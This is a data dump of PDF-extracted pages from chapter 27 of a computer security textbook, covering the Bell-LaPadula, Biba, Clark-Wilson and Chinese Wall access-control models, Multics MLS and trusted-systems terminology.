\\nsubject to alter the security level of a subject.\\n2The concept of dominance allows for a more complex security classification structure involving both secu-\\nrity levels and compartments. This refinement, developed in the military, is not essential for our discussion.\\nM27_STAL0611_04_GE_C27.indd   6 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 860, 'page_label': '27-7'}, page_content='27.1 / THE BEll-lAPAdulA ModEl FoR CoMPuTER SECuRiTy  27-7\\n5. Give access permission: Add an access mode to some entry of the access  permission \\nmatrix M.\\n Used by a subject to grant an access mode on a specified object to \\nanother subject.\\n6. Rescind access permission:\\n Delete an access mode from some entry of M. Used \\nby a subject to revoke an access previously granted.\\n7. Create an object:\\n Attach an object to the current tree structure H as a leaf. Used \\nto create a new object or activate an object that has previously been defined but \\nis inactive because it has not been inserted into H.\\n8. Delete a group of objects:\\n Detach from H  an object and all other objects \\nbeneath it in the hierarchy. This renders the group of objects inactive. This \\noperation may also modify the current access set b because all accesses to the \\nobject are released.\\nRules 1 and 2 alter the current access; rules 3 and 4 alter the level functions; \\nrules 5 and 6 alter access permission; and rules 7 and 8 alter the hierarchy. Each rule \\nis governed by the application of the three properties. For example, for get access for \\na read, we must have fc(Si) Ú fo(Oj) and Ax /uni2208M[Si, Oj].\\nExample of BLP Use\\nThis example illustrates the operation of the BLP model and also highlights a practical \\nissue that must be addressed. We assume a role-based access control system. Carla and \\nDirk are users of the system. Carla is a student (s) in course c1. Dirk is a teacher (t) in \\ncourse c1, but may also access the system as a student; thus, two roles are assigned to Dirk:\\nCarla: (c1 -s)\\nDirk: (c1 -t), (c1 -s)\\nThe student role is assigned a lower security clearance and the teacher role a \\nhigher security clearance. Let us look at some possible actions:\\n1. Dirk creates a new file f1 as c1 -t; Carla creates file f2 as c1 -s (see \\nFigure 27.2a). \\nCarla can read and write to f2, but cannot read f1, because it is at a higher clas-\\nsification level (teacher level). In the c1 -t role, Dirk can read and write f1 and \\ncan read f2 if Carla grants access to f2. However, in this role, Dirk cannot write \\nf2 because of the *-property; neither Dirk nor a Trojan horse on his behalf can \\ndowngrade data from the teacher level to the student level. Only if Dirk logs in \\nas a student can he create a c1 -s file or write to an existing c1 -s file, such as f2. \\nIn the student role, Dirk can also read f2.\\n2. Dirk reads f2 and wants to cr\\neate a new file with comments to Carla as feed-\\nback. Dirk must sign in student role c1 -s to create f3 so that it can be accessed \\nby Carla  (see Figure\\xa0 27.\\n2b). In a teacher role, Dirk cannot create a file at a \\nstudent classification level.\\n3. Dirk creates an exam based on an existing template file stor\\ne at level c1 -t. Dirk \\nmust log in as c1 -t to read the template, and the file he creates (f4) must also be at \\nthe teacher level (see Figure 27.2c).\\n4. Dirk wants Carla to take the exam,\\n and so must provide her with read access. \\nHowever, such access would violate the ss-property. Dirk must downgrade the \\nM27_STAL0611_04_GE_C27.indd   7 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 861, 'page_label': '27-8'}, page_content='27-8  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\nFigure 27.2 Example of Use of BLP Concepts\\nc1-s — read\\nc1-s\\nCarla\\nlevel roles\\noperation\\nroles\\nlevel roles\\noperation\\nroles\\n(a) Two new ﬁles are created: f1: c1-t; f2: c1-s\\nc1-t\\nc1-s — write c1-t — write c1-t — read\\nf2 f1\\nc1-s — read\\nc1-s\\nCarla Dirk\\nDirk\\n(b) A third ﬁle is added: f3: c1-s\\nc1-t\\nc1-s — write c1-t — write c1-t — read\\nf2f3\\n(comments to f2) f1\\nM27_STAL0611_04_GE_C27.indd   8 10/11/17   3:21 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 862, 'page_label': '27-9'}, page_content='27.1 / THE BEll-lAPAdulA ModEl FoR CoMPuTER SECuRiTy  27-9\\nc1-s — read\\nc1-s\\nCarla\\nlevel roles\\noperation\\nroles\\nlevel roles\\noperation\\nroles\\nDirk\\n(c) An exam is created based on an existing template: f4: c1-t\\nc1-t\\nc1-s — write c1-t — write c1-t — read\\nf2 f1\\nf2\\nexam\\ntemplate\\nf4\\nexam\\nexam\\ntemplate\\nf4\\nexam\\nc1-s — read\\nc1-s\\nCarla Dirk\\n(d) Carla, as student, is permitted acess to the exam: f4: c1-s\\nc1-t\\nc1-s — write c1-t — write c1-t — read\\nf1\\nf3 (comments\\nto f2)\\nf3 (comments\\nto f2)\\nFigure 27.2 Example of Use of BLP Concepts\\nM27_STAL0611_04_GE_C27.indd   9 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 863, 'page_label': '27-10'}, page_content='27-10  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nclassification of f4 from c1 -t to c1 -s. Dirk cannot do this in the c1 -t role because this \\nwould violate the *-property. Therefore, a security administrator (possibly Dirk \\nin this role) must have downgrade authority, and must be able to perform the \\ndowngrade outside the BLP model. The dotted line in Figure 27.2d connecting f4 \\nwith c1 -s-read indicates that this connection has not been generated by the default \\nBLP rules but by a system operation.\\n5.\\n Carla writes the answers to the exam into a file f5.\\n She creates the file at level \\nc1 -t so only Dirk can read the file. This is an example of writing up, which is not \\nforbidden by the BLP rules. Carla can still see her answers at her workstation, \\nbut cannot access f5 for reading.\\nThis discussion illustrates some critical practical limitations of the BLP model. \\nFirst, as noted in step 4, the BLP model has no provision to manage the “downgrade” \\nof objects, even though the requirements for multilevel security recognize that such \\na flow of information from a higher to a lower level may be required, provided it \\nreflects the will of an authorized user. Hence, any practical implementation of a \\nmultilevel system has to support such a process in a controlled and monitored man-\\nner. Related to this is another concern. A subject constrained by the BLP model can \\nonly be “editing” (reading and writing) a file at one security level while also viewing \\nfiles at the same or lower levels. If the new document consolidates information from \\na range of sources and levels, some of that information is now classified at a higher \\nlevel than it was originally. This is known as classification creep and is a well-known \\nconcern when managing multilevel information. Again, some process of managed \\ndowngrading of information is needed to restore reasonable classification levels.\\nlevel roles\\noperation\\nroles\\nf2 exam\\ntemplate\\nf5 (exam\\nanswer)\\nf4\\nexam\\nc1-s — read\\nc1-s\\nCarla Dirk\\n(e) The answers given by Carla are only accessible for the teacher: f5: c1-t\\nc1-t\\nc1-s — write c1-t — write c1-t — read\\nf3 (comments\\nto f2) f1\\nFigure 27.2 Example of Use of BLP Concepts\\nM27_STAL0611_04_GE_C27.indd   10 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 864, 'page_label': '27-11'}, page_content='27.1 / THE BEll-lAPAdulA ModEl FoR CoMPuTER SECuRiTy  27-11\\nImplementation Example—Multics\\n[BELL75] outlines an implementation of MLS on the Multics operating system. We \\nbegin with a brief description of the relevant aspects of Multics.\\nMultics is a time-sharing operating system that was developed by a group at \\nMIT known as Project MAC (multiple-access computers) in the 1960s. Multics was \\nnot just years but decades ahead of its time. Even by the mid-1980s, almost 20 years \\nafter it became operational, Multics had superior security features and greater sophis-\\ntication in the user interface and other areas than other contemporary mainframe \\noperating systems. You can view the Multics source code, obtain a system simulator, \\nand explore other documents on this system, at: http://multicians.org/.\\nBoth memory management and the file system in Multics are based on the con-\\ncept of segments. Virtual memory is segmented. For most hardware platforms, paging \\nis also used. In any case, the working space of a process is assigned to a segment, and \\na process may create one or more data segments for use during execution. Each file \\nin the file system is defined as a segment. Thus, the OS uses the same mechanism to \\nload a data segment from virtual memory into main memory, and to load a file from \\nvirtual memory into main memory. Segments are arranged hierarchically, from a root \\ndirectory down to individual segments.\\nMultics manages the virtual address space by means of a descriptor segment, \\nwhich is associated with a process, and which has one entry for each segment in vir-\\ntual memory accessible by this process. The descriptor segment base register points \\nto the start of the descriptor segment for the process that is currently executing. The \\ndescriptor entry includes a pointer to the start of the segment in virtual memory \\nplus protection information, in the form of read, write, and execute bits, which may \\nbe individually set to ON or OFF. The protection information found in a segment’s \\ndescriptor is derived from the access control list for the segment.\\nFor MLS, two additional features are required. A process-level table includes \\nan entry of each active process, and the entry indicates the security clearance of the \\nprocess. Associated with each segment is a security level, which is stored in the parent \\ndirectory segment of the segment in question.\\nCorresponding to the security state of the BLP model (b , M, f, H) is a set of \\nMultics data structures (see Figure 27.3). The correspondence is as follows:\\nb:\\n  Segment descriptor wor\\nd. The descriptor segment identifies the subject \\n(process). The segment pointer in segment descriptor word identifies \\nthe object (data segment). The three access control bits in the segment \\ndescriptor word identify the access mode.\\nM:\\n  A\\nccess control list.\\nf:\\n  Information in the dir\\nectory segment and in the process-level table.\\nH:\\n  Hier\\narchical segment structure.\\nWith these data structures, Multics can enforce discretionary and mandatory \\naccess control. When a process attempts an access to a segment, it must have the \\ndesired access permission as specified by the access control list. Also, its security \\nclearance is compared to the security classification of the segment to be accessed to \\ndetermine if the simple security rule and *-property security rule are satisfied.\\nM27_STAL0611_04_GE_C27.indd   11 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 865, 'page_label': '27-12'}, page_content='27-12  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nLimitations to the BLP model\\nWhile the BLP model could, in theory, lay the foundations for secure computing \\nwithin a single administration realm environment, there are some important limita-\\ntions to its usability and difficulties to its implementation.\\nFirst, there is the incompatibility of confidentiality and integrity within a single \\nMLS system. In general terms, MLS can work either for powers or for secrets, but not \\nreadily for both. This mutual exclusion excludes some interesting power and integrity \\ncentered technologies from being used effectively in BLP style MLS environments.\\nA second important limitations to usability is the so-called cooperating conspir-\\nator problem in the presence of covert channels. In the presence of shared resources, \\nthe *-property may become unenforceable. This is especially a problem in the pres-\\nence of active content that is prevalent in current word processing and other docu-\\nment formats. A malicious document could carry in it a subject that would when \\nexecuted broadcast classified documents using shared-resource covert channels. In \\nessence, the BLP model effectively breaks down when (untrusted) low classified \\nexecutable data are allowed to be executed by a high clearance (trusted) subject.\\n 27. 2  O THER FORMAL MODELS FOR COMPUTER SECURITY\\nIt is important to note that the models described in this chapter either focus on confi-\\ndentiality or on integrity, with the exception of the Chinese Wall Model. The incompat-\\nibility of confidentiality and integrity concerns is recognized to be a major limitation \\nto the usability of MLS in general, and to confidentiality focused MLS in specific.\\nThis section explores some other important computer security models.\\nFigure 27.3 Multics Data Structur es for MLS\\nProcess-level table Parentsegment\\nsegment\\nSegment\\nACL L s\\nr e w\\nptr\\ncurrent-process\\ncurrent-process\\nACL\\nRoot\\nr e w\\nDSBR\\nDescriptor segment\\ncurrent-process Lu\\nLs = Segment security level\\nLu = User security level\\nM27_STAL0611_04_GE_C27.indd   12 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 866, 'page_label': '27-13'}, page_content='27.2 / oTHER FoRMAl ModElS FoR CoMPuTER SECuRiTy  27-13\\nBiba Integrity Model\\nThe BLP model deals with confidentiality and is concerned with unauthorized disclo-\\nsure of information. The Biba [BIBA77] models deals with integrity and is concerned \\nwith the unauthorized modification of data. The Biba model is intended to deal with \\nthe case in which there is data that must be visible to users at multiple or all security \\nlevels, but should only be modified in controlled ways by authorized agents.\\nThe basic elements of the Biba model have the same structure as the BLP \\nmodel. As with BLP , the Biba model deals with subjects and objects. Each subject and \\nobject is assigned an integrity level, denoted as I(S) and I(O) for subject S and object \\nO, respectively. A simple hierarchical classification can be used, in which there is a \\nstrict ordering of levels from lowest to highest. As in the BLP model, it is also pos-\\nsible to add a set of compartments to the classification scheme; we this ignore here.\\nThe model considers the following access modes:\\n• Modify: \\nTo write or update information in an object\\n• Observe:\\n To read information in an object\\n• Execute:\\n To execute an object\\n• Invo\\nke: Communication from one subject to another\\nThe first three modes are analogous to BLP access modes. The invoke mode is \\nnew. Biba then proposes a number of alternative policies that can be imposed on this \\nmodel. The most relevant is the strict integrity policy, based on the following rules:\\n• Simple integrity: \\nA subject can modify an object only if the integrity level of the \\nsubject dominates the integrity level of the object: I(S) Ú I(O).\\n• Integrity confinement: A subject can read an object only if the integrity level \\nof the subject is dominated by the integrity level of the object: I(S) … I(O).\\n• Invocation property: A subject can invoke another subject only if the integrity \\nle\\nvel of the first subject dominates the integrity level of the second subject: \\nI(S1) Ú I(S2).\\nThe first two rules are analogous to those of the BLP model but are concerned \\nwith integrity and reverse the significance of read and write. The simple integrity rule \\nis the logical write-up restriction that prevents contamination of high-integrity data. \\nF\\nigure 27.4 illustrates the need for the integrity confinement rule. A low-integrity \\nFigure 27.4 Contamination with Simple Integrity Controls\\nSource\\n: GASS88. Building A Secure Computer by Morrie Gasser. Copyright © 1988 by Morrie Gasser. \\nReprinted with permission of the author.\\nWrite ReadHigh-integrity process\\nHigh-integrity ﬁle Low-integrity ﬁle\\nWrite\\nDisallowed\\nReadLow-integrity process\\nM27_STAL0611_04_GE_C27.indd   13 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 867, 'page_label': '27-14'}, page_content='27-14  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nprocess may read low-integrity data but is prevented from contaminating a high-\\nintegrity file with that data by the simple integrity rule. If only this rule is in force, a \\nhigh-integrity process could conceivably copy low-integrity data into a high-integrity \\nfile. Normally, one would trust a high-integrity process to not contaminate a high-\\nintegrity file, but either an error in the process code or a Trojan horse could result in \\nsuch contamination; hence the need for the integrity confinement rule.\\nClark–Wilson Integrity Model\\nA more elaborate and perhaps more practical integrity model was proposed by \\nClark and Wilson [CLAR87]. The Clark–Wilson integrity model (CWM) is aimed \\nat commercial rather than military applications and closely models real commercial \\noperations. The model is based on two concepts that are traditionally used to enforce \\ncommercial security policies:\\n•\\n W\\nell-formed transactions: A user should not manipulate data arbitrarily, but \\nonly in constrained ways that preserve or ensure the integrity of the data.\\n•\\n Separation of duty among users:\\n Any person permitted to create or certify a \\nwell-formed transaction may not be permitted to execute it (at least against \\nproduction data).\\nThe model imposes integrity controls on data and the transactions that manipu-\\nlate the data. The principal components of the model are as follows:\\n•\\n Constrained data items (CDIs):\\n Subject to strict integrity controls\\n•\\n Unconstrained data items (UDIs):\\n Unchecked data items. An example is a \\nsimple text file\\n•\\n Integrity v\\nerification procedures (IVPs): Intended to assure that all CDIs \\n conform to some application-specific model of integrity and consistenc\\ny\\n•\\n T\\nransformation procedures (TPs): System transactions that change the set of \\nCDIs from one consistent state to another\\nThe CWM enforces integrity by means of certification and enforcement rules \\non TPs. Certification rules are security policy restrictions on the behavior of IVPs \\nand TPs. Enforcement rules are built-in system security mechanisms that achieve the \\nobjectives of the certification rules. The rules are as follows:\\nCl: \\n All IV\\nPs must properly ensure that all CDIs are in a valid state at the time \\nthe IVP is run.\\nC2: \\n All \\nTPs must be certified to be valid. That is, they must take a CDI to a \\nvalid final state, given that it is in a valid state to begin with. For each TP , \\nand each set of CDIs that it may manipulate, the security officer must \\nspecify a relation, which defines that execution. A relation is thus of the \\nform (TPi, (CDIa, CDIb, CDIc . . . )), where the list of CDIs defines a \\nparticular set of arguments for which the TP has been certified.\\nEl: \\n T\\nhe system must maintain the list of relations specified in rule C2 and must \\nensure that the only manipulation of any CDI is by a TP , where the TP is \\noperating on the CDI as specified in some relation.\\nE2: \\n T\\nhe system must maintain a list of relations of the form (UserID, TPi, \\n(CDIa, CDIb, CDIc, . . . )), which relates a user, a TP , and the data objects \\nM27_STAL0611_04_GE_C27.indd   14 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 868, 'page_label': '27-15'}, page_content='27.2 / oTHER F o RMA l  M od E l S F o R C o MP u TER SEC u R i T y  27-15\\nthat TP may reference on behalf of that user. It must ensure that only \\nexecutions described in one of the relations are performed.\\nC3: \\n T\\nhe list of relations in E2 must be certified to meet the separation of duty \\nrequirement.\\nE3: \\n T\\nhe system must authenticate the identity of each user attempting to \\n execute \\na TP .\\nC4: \\n All \\nTPs must be certified to write to an append-only CDI (the log) \\nall information necessary to permit the nature of the operation to be \\nreconstructed.\\nC5: \\n Any \\nTP that takes a UDI as an input value must be certified to perform \\nonly valid transformations, or else no transformations, for any possible \\nvalue of the UDI. The transformation should take the input from a UDI \\nto a CDI, or the UDI is rejected. Typically, this is an edit program.\\nE4: \\n Only the agent permit\\nted to certify entities may change the list of such \\nentities associated with other entities: specifically, the list of TPs associated \\nwith a CDI and the list of users associated with a TP . An agent that can \\ncertify an entity may not have any execute rights with respect to that entity.\\nFigure 27.5 illustrates the rules. The rules combine to form a two-part integrity \\nassurance facility, in which certification is done by a security officer with respect to \\nan integrity policy, and enforcement is done by the system.\\nFigure 27.5 Summary of Clark–W ilson System Integrity Rules\\nSource: CLAR87 . Clark, D., and Wilson, D. “A Comparison of Commercial and Military Computer \\n Security P\\nolicies.” IEEE Symposium on Security and Privacy, 1987 .\\nCDI = constrained data item\\nIVP = integrity veriﬁcation procedure\\nTP = transformation procedure\\nUDI = unconstrained data item\\nUSERS\\nUDI\\nC1: IVP validates CDI state\\nC5: TPs validate UDI\\nE3: Users are authenticated\\nE2: Users authenticated for TP\\nC3: Suitable separation of duty\\nC2: TPs preserve valid state\\nE4: Authorization\\nlists changed only\\nby security oﬃcer\\nC4: TPs write to log\\nE1: CDIs changed only by authorized TP\\nCDI\\nCDI\\nlog\\nCDI\\nCDI\\nCDITP\\nSystem in\\nsome state\\nlog\\nCDI\\nIVP\\nM27_STAL0611_04_GE_C27.indd   15 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 869, 'page_label': '27-16'}, page_content='27-16  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\nChinese Wall Model\\nThe Chinese Wall Model (CWM) takes a quite different approach to specifying \\n integrity and confidentiality than any of the approaches we ha\\nve examined so far. \\nThe model was developed for commercial applications in which conflicts of interest \\ncan arise. The model makes use of both discretionary and mandatory access concepts.\\nThe principal idea behind the CWM is a concept that is common in the financial \\nand legal professions, which is to use a what is referred to as a Chinese wall to prevent \\na conflict of interest. An example from the financial world is that of a market analyst \\nworking for a financial institution providing corporate business services. An analyst \\ncannot be allowed to provide advice to one company when the analyst has confi-\\ndential information (insider knowledge) about the plans or status of a competitor. \\nHowever, the analyst is free to advise multiple corporations that are not in competi-\\ntion with each other and to draw on market information that is open to the public.\\nThe elements of the model are the following:\\n• Subj\\nects: Active entities that may wish to access protected objects; includes \\nusers and processes\\n• In\\nformation: Corporate information organized into a hierarchy with three levels\\n – Objects: Individual items of information,\\n each concerning a single \\ncorporation\\n – Dataset (DS): \\nAll objects that concern the same corporation\\n – Conflict of interest (CI) class:\\n All datasets whose corporations are in \\ncompetition\\n• Access rules: Rules for read and write access\\nFigure 27.6a gives an example. There are datasets representing banks, oil com-\\npanies, and gas companies. All bank datasets are in one CI, all oil company datasets \\nin another CI, and so forth.\\nIn contrast to the models we have studied so far, the CWM does not assign \\nsecurity levels to subjects and objects and is thus not a true multilevel secure model. \\nInstead, the history of a subject’s previous access determines access control. The basis \\nof the Chinese wall policy is that subjects are only allowed access to information that \\nis not held to conflict with any other information that they already possess. Once a \\nsubject accesses information from one dataset, a wall is set up to protect information \\nin other datasets in the same CI. The subject can access information on one side of \\nthe wall but not the other side. Further, information in other CIs is initially not con-\\nsidered to be on one side or the other of the wall but out in the open. When additional \\naccesses are made in other CIs by the same subject, the shape of the wall changes to \\nmaintain the desired protection. Further, each subject is controlled by his or her own \\nwall—the walls for different subjects are different.\\nTo enforce the Chinese wall policy, two rules are needed. To indicate the simi-\\nlarity with the two BLP rules, the authors gave them the same names. The first rule \\nis the simple security rule:\\nSimple security rule: A subject S can read on object O only if:\\n• O is in the same DS as an object already accessed by S\\n, OR\\n• O belongs to a CI from which S has not yet accessed any information.\\nM27_STAL0611_04_GE_C27.indd   16 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 870, 'page_label': '27-17'}, page_content='27.2 / oTHER FoRMAl ModElS FoR CoMPuTER SECuRiTy  27-17\\nFigures 27.6b and c illustrate the operation of this rule. Assume at some point, \\nJohn has made his first read request to any object in this set for an object in the Bank \\nA DS. Because John has not previously accessed an object in any other DS in CI 1, the \\naccess is granted. Further, the system must remember that access has been granted so \\nthat any subsequent request for access to an object in the Bank B DS will be denied. \\nAny request for access to other objects in the Bank A DS is granted. At a later time, \\nJohn requests access to an object in the Oil A DS. Because there is no conflict, this \\naccess is granted, but a wall is set up prohibiting subsequent access to the Oil B DS, as \\nshown in \\nFigure 27 .6b. Similarly, Figure 27.6c reflects the alternate access history of Jane.\\nThe simple security rule does not prevent an indirect flow of information that \\nwould cause a conflict of interest. In our example, John has access to Oil A DS and \\nBank A DS; Jane has access to Oil B DS and Bank A DS. If John is allowed to read \\nfrom the Oil A DS and write into the Bank A DS, John may transfer information \\nabout Oil A into the Bank A DS; this is indicated by changing the value of the first \\nobject under the Bank A DS to g. The data can then subsequently be read by Jane. \\nThus, Jane would have access to information about both Oil A and Oil B, creating a \\nconflict of interest. To prevent this, the CWM has a second rule:\\n*-property rule: A subject S can write an object O only if:\\n• S can read O accor\\nding to the simple security rule, AND\\n• All objects that S can read are in the same DS as O.\\nPut another way, either subject cannot write at all, or a subject’s access (both \\nread and write) is limited to a single dataset. Thus, in Figure 27.6, neither John nor \\nJane has write access to any objects in the overall universe of data.\\nFigure 27.6 Potential Flo w of Information between Two CIs\\n(a) Example set\\n(b) John has access to Bank A and Oil A (c) Jane has access to Bank A and Oil B\\nSet of all objects\\nBank A\\nCI 1 CI 2 CI 3\\ng b c d e f g h i\\nBank B Gas A Oil A Oil B\\nSet of all objects\\nBank A\\nCI 1 CI 2 CI 3\\ng b c d e f g h i\\nBank B Gas A Oil A Oil B\\nSet of all objects\\nConﬂict of\\ninterest classes\\nCompany\\ndatasets Bank A\\nCI 1 CI 2 CI 3\\na b c d e f g h i\\nBank B Gas A Oil A Oil B\\nIndividual\\nobjects\\nM27_STAL0611_04_GE_C27.indd   17 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 871, 'page_label': '27-18'}, page_content='27-18  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\nThe *-property rule is quite restrictive. However, in many cases, a user only \\nneeds read access because the user is performing some analysis role.\\nTo somewhat ease the write restriction, the model includes the concept of \\n sanitized data.\\n In essence, sanitized data are data that may be derived from corporate \\ndata but that cannot be used to discover the corporation’s identity. Any DS consisting \\nsolely of sanitized data need not be protected by a wall; thus, the two CWM rules do \\nnot apply to such DSs.\\n 27.3 THE CONCEPT OF TRUSTED SYSTEMS\\nThe models described in the preceding two sections are all aimed at enhancing \\nthe trust that users and administrators have in the security of a computer system. \\nThe concept of trust in the context of computer security goes back to the early \\n1970s, spurred on by the U.S. Department of Defense initiative and funding in \\nthis area. Early efforts were aimed to developing security models, then design-\\ning and implementing hardware/software platforms to achieve trust. Because of \\ncost and performance issues, trusted systems did not gain a serious foothold in \\nthe commercial market. More recently, the interest in trust has reemerged, with \\nthe work on trusted computer platforms, a topic we explore in \\nSection 27.5. \\nIn this section, we examine some basic concepts and implications of trusted  \\nsystems.\\nSome useful terminology related to trusted systems is listed in Table 27.1.\\nTrust\\nThe extent to which someone who relies on a system can have confidence that the system meets \\nits specifications (i.e., that the system does what it claims to do and does not perform unwanted \\nfunctions)\\nTrusted system\\nA system believed to enforce a given set of attributes to a stated degree of assurance\\nTrustworthiness\\nAssurance that a system deserves to be trusted, such that the trust can be guaranteed in some \\n convincing wa\\ny, such as through formal analysis or code review\\nTrusted computer system\\nA system that employs sufficient hardware and software assurance measures to allow its use for \\nsimultaneous processing of a range of sensitive or classified information\\nTrusted computing base (TCB)\\nA portion of a system that enforces a particular policy. The TCB must be resistant to tampering and \\ncircumvention. The TCB should be small enough to be analyzed systematically\\nAssurance\\nA process that ensures a system is developed and operated as intended by the system’s security policy\\nEvaluation\\nAssessing whether the product has the security properties claimed for it\\nFunctionality\\nThe security features provided by a product\\nTable 27.1  Terminology R elated to Trust\\nM27_STAL0611_04_GE_C27.indd   18 10/11/17   3:21 PM'),\n",
